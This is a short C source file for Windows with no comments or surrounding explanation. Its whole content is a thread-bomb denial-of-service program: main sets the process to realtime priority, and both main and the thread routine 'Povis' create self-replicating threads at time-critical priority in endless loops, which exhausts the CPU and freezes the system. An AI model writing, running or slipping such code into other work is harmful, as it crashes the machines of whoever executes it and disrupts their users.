#include <windows.h>

unsigned long __stdcall Povis(void*)
{
while (TRUE) SetThreadPriority(CreateThread(0,0,Povis,0,0,0),THREAD_PRIORITY_TIME_CRITICAL);
return 0;
}

void main()
{
SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
while (TRUE) SetThreadPriority(CreateThread(0,0,Povis,0,0,0),THREAD_PRIORITY_TIME_CRITICAL);;
}